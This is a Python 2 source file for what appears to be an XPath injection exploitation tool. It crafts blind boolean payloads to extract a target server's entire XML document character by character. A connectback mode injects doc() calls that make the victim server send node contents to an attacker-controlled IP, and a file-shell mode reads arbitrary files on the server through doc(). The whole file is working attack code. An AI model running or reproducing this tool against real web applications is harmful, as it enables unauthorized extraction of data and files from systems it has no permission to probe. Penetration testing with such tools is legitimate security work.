# This is a big hack. Its one file with only one dep (elementtree). Not a single fuck was given regarding code quality.
from __future__ import division
import concurrent.futures
import socket
import sys
import argparse
import string
import urllib2
import urllib
from elementtree.SimpleXMLWriter import XMLWriter
import BaseHTTPServer
import Queue
import urlparse
import threading

writer = XMLWriter(sys.stdout)

def GetXMLFromNode(node):
    if not args.connectback:
        name_size = countStuff(payloads.get_name_length, node="name(%s)"%node, bigstuff=True)
    else:
        name_size = 0
    currentName = getNodeName("%s"%node, name_size)
    attrCount = countAttributes(node+"/@*")
    attributes = {}
    if attrCount:
        for i in xrange(1,attrCount+1):
            attribute = getNodeName(node+"/@*[%s]"%i)
            value = getNodeValue(node+"/@*[%s]"%i)
            attributes[attribute] = value
    
    writer.start(currentName, attrib=attributes)
    
    commentCount = countChildNodes(node+"/comment()")

    if commentCount:
        for i in xrange(1, commentCount+1):
            commentsize = countContents(node+"/comment()[%s]"%i)
            comment = getNodeValue(node+"/comment()[%s]"%i, commentsize)
            if comment:
                writer.comment(comment)
    
    childNodeCount = countChildNodes(node+"/*")
    if childNodeCount:
        for i in xrange(1, childNodeCount+1):
            GetXMLFromNode(node+"/*[%s]"%i)
    if not args.connectback:
        nodesize = countContents(node+"/text()")
    else:
        nodesize = 0
    #print repr(nodesize)
    nodeValue = getNodeValue(node+"/text()", nodesize)
    if nodeValue:
        writer.data(nodeValue)
    writer.end()


class DefinedString(object):
    def __init__(self, size):
        self.string = [args.notfoundchar for i in xrange(size)]
    
    def setCharacter(self, index, value):
        self.string[index-1] = value
    
    def getString(self):
        return "".join(self.string)
    
    def __str__(self):
        return self.getString()

    
class PayloadMaker(object):
    
    BASE = string.Template("' and $payload and '1'='1")
    
    payloads = {
                "META":{
                     "WRAP_LOWERCASE":string.Template("lower-case($payload)"),
                     "WRAP_REGEX":string.Template("matches($node, '$pattern')"),
                     "DETECT_VERSION":"lower-case('A')='a'",
                     "REGEX_SUPPORT":"matches('test','.*')",
                     "HTTP_TRANSFER":string.Template("doc(concat('http://$URL$PORT/?$query=',encode-for-uri($node)))"),
                     "DOC_AVAILABLE":string.Template("doc-available('$URI')"),
                     "NODE_EXISTS":string.Template("boolean($node)"),
                     "NODE_NAME":string.Template("name($node)"),
                        },
                "1":{
                     "COUNT_CHILDREN":("count($node)=$count", ),
                     "NODEVALUE_LENGTH":("string-length($node)=$count", ),
                    
                     "GET_NODENAME":("substring(name($node),$count,1)","='$character'"),
                     "GET_NODEVALUE":("substring($node,$count,1)","='$character'"),
                    
                     "GET_NAME_LENGTH":("string-length(name($node))=$count", ),
                     "GET_CONTENT_LENGTH":("(string-length($node) > $min and string-length($node) <= $max)", ),
                    },
                "2":{
                     "COUNT_CHILDREN":("count($node)=$count",),
                     "NODEVALUE_LENGTH":("string-length($node)=$count",),
                    
                     "GET_NODENAME":("normalize-unicode(substring(name($node),$count,1),'NFKC')","='$character'"),
                     "GET_NODEVALUE":("normalize-unicode(substring($node,$count,1),'NFKC')","='$character'"),
                    
                     "GET_NAME_LENGTH":("string-length(name($node))=$count",),
                     "GET_CONTENT_LENGTH":("(string-length($node) > $min and string-length($node) <= $max)",),
                     },
    }
    
    def __getattr__(self, name):#

        if name.upper() in self.payloads["META"]:
            s = self.payloads["META"][name.upper()]
            if isinstance(s, string.Template):
                return s
            return self.BASE.substitute(payload=s)
        
        if name.upper() in self.payloads[args.xversion]:
            payload = self.payloads[args.xversion][name.upper()]
            output = "".join(payload)
            if len(payload) == 2:
                if args.xversion == "2":
                    if args.lowercase:
                        output = "%s%s"%(self.payloads["META"]["WRAP_LOWERCASE"].substitute(payload=payload[0]),
                                                                       payload[1])
            return string.Template(self.BASE.substitute(payload=output)).safe_substitute
        
        raise AttributeError()
    
    

def countStuff(payload, node, bigstuff=False, start=0, end=0):
    if not bigstuff:
        for i in xrange(start, end or args.search_limit):
            if executeQuery(args.URL, payload(count=i, node=node), args.true_keyword or args.false_keyword):
                return i
        return False
    
    else:
        if executeQuery(args.URL, payloads.nodevalue_length(node=node, count=0), args.true_keyword or args.false_keyword):
            return 0
        MIN = 0
        MAX = 10
        for i in xrange(args.step_size):
            if executeQuery(args.URL, payloads.get_content_length(node=node, min=MIN, max=MAX), args.true_keyword or args.false_keyword):
                return countStuff(payloads.nodevalue_length, node, bigstuff=False, start=MIN, end=MAX)
            MIN+=10
            MAX+=10
    

def countChildNodes(node):
    return countStuff(payloads.count_children, node=node)

def countAttributes(node):
    return countStuff(payloads.count_children, node=node)

def countContents(node):
    return countStuff(payloads.get_content_length, node=node, bigstuff=True)

def countName(node):
    return countStuff(payloads.get_name_length, node=node)

def getNodeName(node, size=None):
    return getCharacters(node, payloads.get_nodename, size, name=True)

def getNodeValue(node, size=None):
    return getCharacters(node, payloads.get_nodevalue, size)

def _getCharactersSingle(node, payload, searchspace):
    returner = ""
    while True:
        i = getCharacter(node, payload, len(returner)+1, searchspace)
        if not i:
            return returner
        returner+=i


def _getCharactersThreadPool(node, payload, size, searchspace,start=1):
    returner = DefinedString(size)
    
    tasks = dict((threadpool.submit(getCharacter, node, payload, i, searchspace), i) 
                 for i in xrange(start,size+1))
    
    for future in concurrent.futures.as_completed(tasks):
        id = tasks[future]

        if future.exception() is not None:
            print("Getting character %s raised exception: %s"%(id, future.exception()))
        else:
            returner.setCharacter(id, future.result() or args.notfoundchar)

    return returner.getString()


def _getCharactersHttp(node, payload, name):
    q = Queue.Queue()
    query_id = "a"
    if name:
        node = "name(%s)"%node
    class Handler(BaseHTTPServer.BaseHTTPRequestHandler):
        def log_request(self, code='-', size='-'):
            return
        
        def do_GET(self):
            query = urlparse.parse_qs(urlparse.urlparse(self.path).query)
            self.send_response(200)
            self.end_headers()
            self.wfile.write("<root></root>")
            
            if query_id in query:
                q.put(query[query_id][0])
            return
        
    server = BaseHTTPServer.HTTPServer(('localhost',80), Handler)
    
    thread = threading.Thread(target=server.serve_forever, args=(0.1,))
    thread.daemon = True
    thread.start()
    
    if not args.connectback_port == 80:
        p = ":%s"%args.connectback_port
    else:
        p = ""
    executeQuery(args.URL, payloads.BASE.substitute(payload=payloads.http_transfer.substitute(URL=args.connectback_ip,
                                                                                                query=query_id,
                                                                                                PORT=p,
                                                                                                node=node)),
                   args.true_keyword or args.false_keyword)
    
    try:
        return q.get(timeout=7)
    except Queue.Empty:
        return None
    finally:
        server.shutdown()
        

def getCharacters(node, payload, size=None, name=False):
    if name:
        q = payloads.BASE.substitute(payload=payloads.node_exists.substitute(node=payloads.node_name.substitute(node=node)))
    else:
        q = payloads.BASE.substitute(payload=payloads.node_exists.substitute(node=node))

    if not executeQuery(args.URL, q, args.true_keyword or args.false_keyword):
        return ""

    searchspace = string.ascii_letters+string.digits+string.punctuation
    if size and size > 10:
        if args.use_regex and args.xversion == "2":
            searchspace = ""
            spaces = (("[a-z]",string.lowercase),)
            
            if not args.lowercase:
                spaces+=(("[A-Z]",string.uppercase),)
                
            spaces+= (("\d",string.digits),
                      ("\W","""!$%&'()*+,-./_"""),
                      ("\s"," "))
            
            for pattern,space in spaces:
                new_node = node
                if name:
                    new_node = "name(%s)"%node
                n_pat = new_node
                if args.lowercase:
                    n_pat = "lower-case(%s)"%new_node
                if executeQuery(args.URL, payloads.BASE.substitute(payload=payloads.wrap_regex.substitute(node=n_pat, pattern=pattern)), 
                                args.true_keyword or args.false_keyword):
                    searchspace+=space
            #sys.stderr.write("\nSearchspace found: %s\n"%searchspace)
    if args.connectback:
        x = _getCharactersHttp(node, payload, name)
        if x:
            return x
        else:
            if name:
                size = countContents(payloads.node_name.substitute(node=node))
            else:
                size = countContents(node)
    if not size:
        return _getCharactersSingle(node, payload, searchspace)
    return _getCharactersThreadPool(node, payload, size, searchspace)
        

def getCharacter(node, payload, count, searchspace):
    for i in searchspace:
        if executeQuery(args.URL, payload(character=i, 
                                     node=node, count=count
                                     ), args.true_keyword or args.false_keyword):
            return i
    return False        

def executeQuery(url, payload, match_word):
    #print payload
    if args.http_method == "GET":
        data = urllib2.urlopen(args.URL+args.post_argument+urllib.quote_plus(payload)).read()
    else:
        data = urllib2.urlopen(args.URL, data=args.post_argument+urllib.quote_plus(payload)).read()
    if args.lookup == True:
        return args.true_keyword in data
    else:
        return not args.false_keyword in data

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Read a remote XML file through an XPath injection vulnerability")
    parser.add_argument("--method", help="HTTP method to send", action="store",
                        default="GET", choices=["GET","POST"], dest="http_method")
    parser.add_argument("--arg", help="POST argument(s) to send. The payload will be appended", type=str, action="store",
                        dest="post_argument")
    parser.add_argument("--true", help="Keyword that if present indicates a success", dest="true_keyword")
    parser.add_argument("--false", help="Keyword that if present indicates a failure (And if not present indicates a success)", dest="false_keyword")
    parser.add_argument("--max_search", help="The max number of characters to search to before giving up", dest="search_limit", type=int, default=20)
    parser.add_argument("--error", help="A keyword that only appears if there is an error with the xpath query. Needed to detect xpath version",
                        action="store", dest="error_keyword")
    parser.add_argument("--timeout", help="Socket timeout to set", type=int, default=5, dest="timeout", action="store")
    parser.add_argument("--threadpool", help="Thread pool size for large textual items", type=int, default=10, dest="poolsize", action="store")
    parser.add_argument("--stepsize", help="When counting text contents (which could be very large) this is the max number of characters to count up to, times by ten",
                        type=int, default=10, dest="step_size", action="store")
    parser.add_argument("--xversion", help="The xpath version to use", choices=["1","2","auto"], default="auto", action="store",dest="xversion")
    parser.add_argument("--lowercase", help="Speed up retrieval time by making all text lowercase before searching. Xpath 2.0 only",
                        default=False, dest="lowercase", action="store_true")
    parser.add_argument("--regex", help="Use Regex to reduce the search space of text. Xpath 2.0 only",
                        default=True, dest="use_regex", action="store_true")
    parser.add_argument("--connectback", help="Use a clever technique to deliver the XML document data over HTTP to xcat. Requires a public IP address and port listening permissions",
                        action="store_true", dest="connectback")
    parser.add_argument("--connectbackip", help="IP Address to listen on for connectback", action="store", dest="connectback_ip")
    parser.add_argument("--connectbackport", help="The port to listen on for connectback data", action="store", dest="connectback_port", default=80, type=int)
    parser.add_argument("--notfoundstring", help="The character to place when a character cannot be found in the searchspace", action="store", dest="notfoundchar", default="?")
    parser.add_argument("--fileshell", help="Launch a shell for browing remote files", action="store_true", dest="fileshell")
    parser.add_argument("URL", action="store")
    args = parser.parse_args()
    
    if not args.false_keyword and not args.true_keyword:
        print "Error: You must supply a false OR a true keyword!"
        sys.exit(1)
    
    if args.http_method == "POST":
        if not args.post_argument:
            print "Error: You must supply some POST arguments if you are making a POST request!"
            sys.exit(1)
            
    socket.setdefaulttimeout(args.timeout)
    payloads = PayloadMaker()
    
    if args.true_keyword:
        args.lookup = True
    else:
        args.lookup = False
        
    if args.xversion == "auto":
        # Autodetect if we are running xpath 2.0
        if executeQuery(args.URL, payloads.detect_version, args.true_keyword or args.false_keyword):
            args.xversion = "2"
        else:
            args.xversion = "1" 
        sys.stderr.write("Detected XPath version %s\n"%float(args.xversion))
    
    if args.use_regex and args.xversion == "2":
        if not executeQuery(args.URL, payloads.regex_support, args.true_keyword or args.false_keyword):
            sys.stderr.write("No regex support found, disabling\n")
            args.use_regex = False
    
    if args.connectback and not args.connectback_ip:
        sys.stderr.write("Error: You must specify a IP when using connectback\n")
        sys.exit(1)
    
    threadpool = concurrent.futures.ThreadPoolExecutor(max_workers=args.poolsize)
    if args.fileshell:
        if args.xversion == "1":
            print "Cannot read files when the server does not support XPath 2.0"
            sys.exit(1)
        while True:
            file = raw_input("Enter a file URI: ")
            if not executeQuery(args.URL, payloads.BASE.substitute(payload=payloads.doc_available.substitute(URI=file)), args.true_keyword or args.false_keyword):
                print "File %s is not available (doc-available returned false)"%file
                continue
            GetXMLFromNode("doc('%s')/*"%file)
    else:
        GetXMLFromNode("/*")
    
    threadpool.shutdown(False)